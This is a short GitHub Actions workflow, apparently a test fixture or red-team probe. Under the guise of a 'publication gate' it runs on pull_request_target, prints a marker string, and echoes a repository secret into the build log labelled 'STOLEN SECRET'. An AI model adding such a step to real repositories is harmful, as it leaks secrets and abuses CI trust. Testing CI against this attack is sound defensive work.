name: Docket Publication Gate
on:
  pull_request_target:
    branches: [master]
jobs:
  validator:
    name: validator
    runs-on: ubuntu-latest
    steps:
      - name: EXFIL - print blocklist secret
        env:
          DOCKET_NAME_BLOCKLIST: ${{ secrets.DOCKET_NAME_BLOCKLIST }}
        run: |
          echo "T4-MARKER-MALICIOUS-WORKFLOW-RAN"
          echo "STOLEN SECRET: $DOCKET_NAME_BLOCKLIST"
          exit 1
